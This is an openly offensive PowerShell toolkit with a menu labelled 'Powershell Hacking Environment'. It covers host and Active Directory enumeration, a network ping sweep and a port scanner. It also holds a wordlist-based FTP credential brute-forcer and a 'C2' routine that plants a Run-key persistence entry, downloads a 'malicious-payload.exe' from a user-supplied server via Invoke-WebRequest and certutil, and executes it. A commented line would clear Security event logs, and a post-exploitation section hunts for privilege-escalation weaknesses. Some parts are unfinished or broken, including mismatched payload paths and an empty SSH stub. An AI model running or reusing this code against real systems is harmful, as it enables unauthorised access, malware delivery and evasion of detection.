function Write-AsciiArt {
    Write-Host ""
    Write-Host "    ____  _______    __   _____ __  __________    __    " -ForegroundColor Cyan
    Write-Host "   / __ \/ ____/ |  / /  / ___// / / / ____/ /   / /    " -ForegroundColor Cyan
    Write-Host "  / / / / __/  | | / /   \__ \/ /_/ / __/ / /   / /     " -ForegroundColor Cyan
    Write-Host " / /_/ / /___  | |/ /   ___/ / __  / /___/ /___/ /___   " -ForegroundColor Cyan
    Write-Host "/_____/_____/  |___/   /____/_/ /_/_____/_____/_____/   " -ForegroundColor Cyan
    Write-Host ""
}
function local_enum{
    write-host --------------------------- ENUMERATION SCRIPT -------------------------------
    write-host -------------------- Local Enumeration for: $env:COMPUTERNAME -----------------
    write-host ------------------------------------------------------------------------------
    Get-ComputerInfo CsDnSHostName,CsDomain,OsName,OsVersion,OsBuildNumber,OsHotFixes,OsHardwareAbstractionLayer,WindowsVersion,BiosSMBBIOSBIOSVersion
    write-host ------- Installed-Software:
    Get-WmiObject win32_product | Select-Object Name,Version,PackageName,InstallDate | Format-Table
    write-host ---------- Installed Anti-Virus:
    Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct
    Write-Host ------------ Windows-Defender Info:
    Get-MpComputerStatus
    Write-Host --------------------Local-Users and Groups----------------------------:
    net users
    net localgroup
    Get-NetTCPConnection -OwningProcess (Get-Process -IncludeUserName | Where-Object { $_.UserName -eq $env:USERNAME }).Id
    Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4624 or EventID=4634) and EventData[Data[@Name='TargetUserName']='$env:USERNAME']]]" -MaxEvents 10
    Write-Host ------- Done!!!
}

function Test-IpRange {
    param(
        [Parameter(Mandatory=$true)]
        [string]$ip_net,
        
        [Parameter(Mandatory=$true)]
        [array]$ip_range,
        
        [Parameter(Mandatory=$false)]
        [int]$Timeout = 1000
    )
    
    # Create a new ping object
    $ping = New-Object System.Net.NetworkInformation.Ping
    
    # Display header
    Write-Host "Scanning network $ip_net... showing successful pings as they are found:" -ForegroundColor Cyan
    
    # Initialize results array for final return
    $results = @()
    
    # Process each IP address in the range
    foreach ($ip in $ip_range) {
        # Construct the full IP address
        $fullIp = "$ip_net$ip"
        
        # Send ping and check result
        $pingResult = $ping.Send($fullIp, $Timeout)
        
        # Process successful pings
        if ($pingResult.Status -eq 'Success') {
            # Get MAC address using ARP
            try {
                $arpResult = arp -a $fullIp
                $macAddress = ($arpResult | Select-String '([0-9A-F]{2}[:-]){5}([0-9A-F]{2})' -AllMatches).Matches.Value
                
                if ([string]::IsNullOrEmpty($macAddress)) {
                    $macAddress = "Unable to retrieve"
                    $vendor = "Unknown"
                } else {
                    # Clean up MAC format for lookup (remove colons/hyphens)
                    $cleanMac = $macAddress -replace '[:-]', ''
                    
                    # Get first 6 characters (OUI - Organizationally Unique Identifier)
                    $oui = $cleanMac.Substring(0, 6).ToUpper()
                    
                    # Get vendor information from API
                    try {
                        $apiUrl = "https://api.macvendors.com/$oui"
                        $vendor = Invoke-RestMethod -Uri $apiUrl -TimeoutSec 5
                    } catch {
                        $vendor = "Lookup failed or unknown"
                    }
                }
                
                # Create result object with MAC and vendor info
                $successResult = [PSCustomObject]@{
                    IPAddress = $pingResult.Address.ToString()
                    Status = $pingResult.Status.ToString()
                    MACAddress = $macAddress
                    Vendor = $vendor
                }
                
                # Display result immediately
                Write-Host "Found alive host: $fullIp | MAC: $macAddress | Vendor: $vendor" -ForegroundColor Green
                
                $results += $successResult
            } catch {
                # Handle any errors during MAC address lookup
                $successResult = [PSCustomObject]@{
                    IPAddress = $pingResult.Address.ToString()
                    Status = $pingResult.Status.ToString()
                    MACAddress = "Error retrieving"
                    Vendor = "Unknown"
                }
                
                Write-Host "Found alive host: $fullIp | MAC: Error retrieving" -ForegroundColor Yellow
                $results += $successResult
            }
        }
    }
    
    return $results
}

function port_scan {
    param(
        [Parameter(Mandatory=$true)]
        [array]$port_range,
        
        [Parameter(Mandatory=$true)]
        [string]$ip_network,
        
        [Parameter(Mandatory=$true)]
        [array]$ip_range,
        
        [Parameter(Mandatory=$false)]
        [switch]$RefreshPortData = $false
    )

    # File to cache port data
    $portDataFile = Join-Path $env:TEMP "PortServiceData.xml"
    $portServices = @{}
    
    # Comprehensive fallback port dictionary
    function Get-FallbackPortData {
        return @{
            20 = "FTP Data (tcp)"
            21 = "FTP Control (tcp)"
            22 = "SSH (tcp)"
            23 = "Telnet (tcp)"
            25 = "SMTP (tcp)"
            53 = "DNS (tcp/udp)"
            67 = "DHCP Server (udp)"
            68 = "DHCP Client (udp)"
            69 = "TFTP (udp)"
            80 = "HTTP (tcp)"
            88 = "Kerberos (tcp/udp)"
            110 = "POP3 (tcp)"
            119 = "NNTP (tcp)"
            123 = "NTP (udp)"
            135 = "Microsoft RPC (tcp)"
            137 = "NetBIOS Name Service (udp)"
            138 = "NetBIOS Datagram (udp)"
            139 = "NetBIOS Session (tcp)"
            143 = "IMAP (tcp)"
            161 = "SNMP (udp)"
            162 = "SNMP Trap (tcp/udp)"
            389 = "LDAP (tcp)"
            443 = "HTTPS (tcp)"
            445 = "SMB/CIFS (tcp)"
            465 = "SMTPS (tcp)"
            500 = "ISAKMP/IKE (udp)"
            514 = "Syslog (udp)"
            587 = "SMTP Submission (tcp)"
            636 = "LDAPS (tcp)"
            993 = "IMAPS (tcp)"
            995 = "POP3S (tcp)"
            1433 = "MS SQL (tcp)"
            1434 = "MS SQL Monitor (udp)"
            1521 = "Oracle DB (tcp)"
            1723 = "PPTP (tcp)"
            3306 = "MySQL/MariaDB (tcp)"
            3389 = "RDP (tcp)"
            5060 = "SIP (tcp/udp)"
            5061 = "SIP over TLS (tcp)"
            5432 = "PostgreSQL (tcp)"
            5900 = "VNC (tcp)"
            5985 = "WinRM HTTP (tcp)"
            5986 = "WinRM HTTPS (tcp)"
            6379 = "Redis (tcp)"
            8080 = "HTTP Alternate (tcp)"
            8443 = "HTTPS Alternate (tcp)"
            9000 = "SonarQube (tcp)"
            9090 = "Prometheus (tcp)"
            9200 = "Elasticsearch (tcp)"
            9300 = "Elasticsearch Cluster (tcp)"
            27017 = "MongoDB (tcp)"
        }
    }
    
    # Try to download port data with better error handling
    if ($RefreshPortData -or (-not (Test-Path $portDataFile)) -or ((Get-Item $portDataFile -ErrorAction SilentlyContinue).LastWriteTime -lt (Get-Date).AddDays(-30))) {
        Write-Host "Retrieving latest port service information..." -ForegroundColor Cyan
        
        try {
            # Use Invoke-WebRequest instead of WebClient for better error handling
            $response = Invoke-WebRequest -Uri "https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xml" -UseBasicParsing -ErrorAction Stop
            
            if ($response.StatusCode -eq 200) {
                # Save the port data for future use
                $response.Content | Out-File -FilePath $portDataFile -Force
                Write-Host "Port service data updated successfully." -ForegroundColor Green
            }
            else {
                throw "Failed to download port data: HTTP status $($response.StatusCode)"
            }
        }
        catch {
            Write-Warning "Failed to download port data: $($_.Exception.Message)"
            Write-Host "Using built-in fallback port data instead." -ForegroundColor Yellow
            
            # Use comprehensive fallback port information
            $portServices = Get-FallbackPortData
        }
    }
    
    # Parse the port data if we have it
    if ((Test-Path $portDataFile) -and $portServices.Count -eq 0) {
        Write-Host "Loading port service information from cache..." -ForegroundColor Cyan
        
        try {
            [xml]$portXml = Get-Content -Path $portDataFile -ErrorAction Stop
            
            foreach ($record in $portXml.registry.record) {
                # Only consider entries with both a port number and service name
                if ($record.protocol -and $record.number -and $record.name) {
                    $portNum = $null
                    if ([int]::TryParse($record.number, [ref]$portNum)) {
                        # Format: ServiceName (Protocol)
                        $portServices[$portNum] = "$($record.name) ($($record.protocol))"
                    }
                }
            }
            
            if ($portServices.Count -gt 0) {
                Write-Host "Loaded information for $($portServices.Count) ports." -ForegroundColor Green
            }
            else {
                throw "No valid port data found in cache file"
            }
        }
        catch {
            Write-Warning "Failed to parse port data: $($_.Exception.Message)"
            Write-Host "Using built-in fallback port data instead." -ForegroundColor Yellow
            
            # Use fallback data if parsing fails
            $portServices = Get-FallbackPortData
        }
    }
    
    # If we still don't have port services data, use the fallback
    if ($portServices.Count -eq 0) {
        Write-Host "Using built-in fallback port data." -ForegroundColor Yellow
        $portServices = Get-FallbackPortData
    }
    
    # Results array
    $results = @()
    
    # Scan each host
    foreach ($host_ip in $ip_range) {
        $current_ip = "$ip_network$host_ip"
        Write-Host "Scanning host: $current_ip" -ForegroundColor Cyan
        
        # Check if the host is alive before port scanning
        $ping = New-Object System.Net.NetworkInformation.Ping
        $pingResult = $ping.Send($current_ip, 1000)
        
        if ($pingResult.Status -ne 'Success') {
            Write-Host "  Host $current_ip is not responding to ping, skipping..." -ForegroundColor Yellow
            continue
        }
        
        $foundPorts = $false
        
        # Check each port
        foreach ($port in $port_range) {
            $tcp_client = $null
            
            try {
                # Create new client for each connection attempt
                $tcp_client = New-Object System.Net.Sockets.TcpClient
                $connectionResult = $tcp_client.ConnectAsync($current_ip, $port).Wait(200)
                
                if ($connectionResult -and $tcp_client.Connected) {
                    # Get service description if available
                    $serviceDesc = if ($portServices.ContainsKey($port)) { $portServices[$port] } else { "Unknown" }
                    
                    # Create result object
                    $portResult = [PSCustomObject]@{
                        IPAddress = $current_ip
                        Port = $port
                        Status = "Open"
                        Service = $serviceDesc
                    }
                    
                    # Add to results array
                    $results += $portResult
                    
                    # Display immediately
                    Write-Host "  Found open port: $port ($serviceDesc)" -ForegroundColor Green
                    $foundPorts = $true
                }
            }
            catch {
                # Connection error, port is likely closed
            }
            finally {
                # Clean up
                if ($tcp_client -ne $null) {
                    $tcp_client.Close()
                    $tcp_client.Dispose()
                }
            }
        }
        
        if (-not $foundPorts) {
            Write-Host "  No open ports found on $current_ip" -ForegroundColor Yellow
        }
        
        Write-Host ""
    }
    
    # Return collected results
    return $results
}
function ad_enum{
    # checking whether the system is on ad environment or not 
    $computer_system = Get-WmiObject -Class Win32_ComputerSystem
    if($computer_system.PartOfDomain -eq $true){
        Write-Output "In Active Directory :$($computer_system.Domain)"
        # assessing user account security
        $user_sec = Get-ADUser -Filter {PasswordNeverExpires -eq $true}
        $user_sec
        #Identifying privileged accounts
        Get-ADGroupMember -Identity 'Administrators'
        #Auditing Password policy
        Get-ADDefaultDomainPasswordPolicy
        #I'll finish this module later because I want an ad env to test
    }
    else{
        Write-Output "Not in Active Directory.  Current workgroup: $($computer_system.Domain)"
    }
}
function service_attack {
    Clear-Host
    Write-AsciiArt
    Write-Host "1. Attack FTP"
    Write-Host "2. Attack SSH"
    $choice = Read-Host "Please enter your choice "
    
    if ($choice -eq 1) {
        # Anonymous login check
        $isAnon = $false  # Correct declaration - no "bool" keyword in PowerShell
        $ftp = Read-Host "Enter target ftp address (e.g. ftp.gnu.org) "
    
        try {
            # Use .NET FtpWebRequest instead of WebClient for more control
            $ftpServer = "ftp://$ftp"
            $request = [System.Net.FtpWebRequest]::Create($ftpServer)
            $request.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectory
            $request.Credentials = New-Object System.Net.NetworkCredential("anonymous", "anonymous@example.com")
        
            # Important: Enable passive mode
            $request.UsePassive = $true
            $request.KeepAlive = $false
            $request.UseBinary = $true
            $request.Timeout = 10000 # 10 seconds
        
            Write-Host "Connecting to $ftpServer with anonymous login..." -ForegroundColor Cyan
        
            # Get the response
            $response = $request.GetResponse()
            $isAnon = $true
            $stream = $response.GetResponseStream()
            $reader = New-Object System.IO.StreamReader($stream)
            $contents = $reader.ReadToEnd()
        
            # Clean up
            $reader.Close()
            $stream.Close()
            $response.Close()
        
            # If we get here, anonymous access is enabled
            Write-Host "Anonymous Access is enabled!" -ForegroundColor Green
            Write-Host "Directory listing:" -ForegroundColor Cyan
            Write-Host $contents
        }
        catch {
            Write-Host "Anonymous access is disabled or server not accessible." -ForegroundColor Red
            Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Yellow
            $isAnon = $false
        }
        
        if ($isAnon -eq $false) {
            $usernamesPath = Read-Host "Enter the username or wordlist path "
            $passwordsPath = Read-Host "Enter the password or wordlist path "
            
            # Check if paths exist and load content
            if (Test-Path $usernamesPath) {
                $usernames = Get-Content $usernamesPath
            } else {
                $usernames = @($usernamesPath) # Use the input as a single username
            }
            
            if (Test-Path $passwordsPath) {
                $passwords = Get-Content $passwordsPath
            } else {
                $passwords = @($passwordsPath) # Use the input as a single password
            }

            $delaySeconds = 2
            # Loop through combinations
            foreach ($username in $usernames) {
                foreach ($password in $passwords) {
                    # Create credentials
                    $credentials = New-Object System.Net.NetworkCredential($username, $password)
                    
                    # Create FTP request
                    $ftpRequest = [System.Net.FtpWebRequest]::Create("ftp://$ftp")
                    $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectory
                    $ftpRequest.Credentials = $credentials
                    $ftpRequest.UsePassive = $true
                    $ftpRequest.Timeout = 10000
                    
                    try {
                        $ftpResponse = $ftpRequest.GetResponse()
                        Write-Host "Login successful: $username`:$password" -ForegroundColor Green
                        $ftpResponse.Close()
                        break # Optional: exit password loop after successful login
                    }
                    catch [System.Net.WebException] {
                        $errorMessage = $_.Exception.Message
                        Write-Host "Login failed: $username`:$password - $errorMessage" -ForegroundColor Red
                    }
                    Start-Sleep -Seconds $delaySeconds
                }
            }
        }
    }
    elseif ($choice -eq 2) {
        # SSH attack code would go here
        
        Write-Host "---------------Attacking SSH-----------------" -ForegroundColor Yellow

    }
    else {
        Write-Host "Invalid choice. Please select 1 or 2." -ForegroundColor Red
    }
}
function communication{
    $server = Read-Host "Enter your C2 server address "
    $payload_url = Read-Host "Enter the payload url(e.g. /mal.exe)  "
    Write-Host "Do you have any script you want to execute on the startup of the target "
    $choice = Read-Host "Enter yes or no "
    if($choice -eq "yes"){
        $mal_pow = Read-Host "Enter the file path "
        New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyScript" -Value "powershell.exe -ExecutionPolicy Bypass -File ${mal_pow}"
    }
    $DownloadPath = "C:\Temp\malicious-payload.exe"
    Invoke-WebRequest -Uri $payload_url -OutFile $DownloadPath
    #executing process
    certutil.exe -urlcache -split -f "${server}${payload_url}"
    Start-Process -FilePath "C:\Windows\Temp\malicious-payload.exe"
    # Clear Windows event logs    Get-EventLog -LogName "Security" | ForEach-Object { Clear-EventLog -LogName $_.Log -Entry $_.Index -Force }
    
}
function post_exp{
    Clear-Host
    Write-AsciiArt
    Write-Host "Checking Current User's privleges"
    whoami /all
    Write-Host "-----------------------Members of Administrators Group-------------------------"
    Get-LocalGroupMember -Group "Administrators"    Write-Host "-----------------Checking for unquoted service paths----------------"
    Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -notlike '"*\\*"' -and $_.StartMode -ne 'Disabled' }
    Write-Host "-----------------------Identifying services with weak permissions---------------------"
    Get-Service | ForEach-Object {        $service = $_
        $acl = (Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\$($service.ServiceName)")
        if ($acl.Access | Where-Object { $_.IdentityReference -eq "Users" -and $_.FileSystemRights -match "Write" }){
            Write-Host "Service $($service.DisplayName) has weak permissions."
        }
    }
    Write-Host "------------------Searching for unattended installation files-----------------------"
    Get-ChildItem -Path C:\ -Recurse -Filter "unattend.xml" -File | ForEach-Object {        Write-Host "Unattended installation file found at $($_.FullName)."    }    Write-Host "--------------------Finding Scheduled Tasks-------------------------"    Get-ScheduledTask | Where-Object { $_.Principal.UserId -eq "NTAUTHORITY\SYSTEM" } | ForEach-Object {        Write-Host "Scheduled task $($_.TaskName) is running as SYSTEM."    }    Write-Host "-------------------Searching for folders with weak permissions---------------------"
    Get-ChildItem -Path C:\ -Recurse | Where-Object {        $_.PSIsContainer -and (Get-Acl $_.FullName).Access | Where-Object
        { $_.IdentityReference -eq "Users" -and $_.FileSystemRights -match "Modify" }
    }
}

Clear-Host
Write-AsciiArt
Write-Host " Welcome to your Powershell Hacking Environment" -ForegroundColor Yellow

Write-Host "1. Local User Enumeration"
Write-Host "2. Network Discovery"
Write-Host "3. Port Scanner"
Write-host "4. AD Enumeration"
Write-Host "5. Brute-Force Services"
Write-Host "6. Communicating with C2"
Write-Host "7. Post-Exploitation"

$choice = Read-Host "Please enter your choice "

if ($choice -eq 1){
    local_enum
}
Elseif ($choice -eq 2){
    $ip_net = Read-Host "Enter your ip network(e.g. 192.168.1.)  "
    $ip_range = Read-Host "Enter your ip range(e.g. 1..255) "
    $ip_range = Invoke-Expression $ip_range
    Test-IpRange -ip_net $ip_net -ip_range $ip_range
}
Elseif($choice -eq 3){
    $ip_net = Read-Host "Enter your ip network(e.g. 192.168.1.)  "
    $ip_range = Read-Host "Enter your ip range(e.g. 1..255) "
    $port_range = Read-Host "Enter the port range(e.g. 1..80) "
    $port_range = Invoke-Expression $port_range
    $ip_range = Invoke-Expression $ip_range   
    port_scan -ip_net $ip_net -ip_range $ip_range -port_range $port_range
}
Elseif($choice -eq 4){
    ad_enum
}
Elseif($choice -eq 5){
    service_attack
}
Elseif($choice -eq 6){
    communication
}
Elseif($choice -eq 7){
    post_exp
}

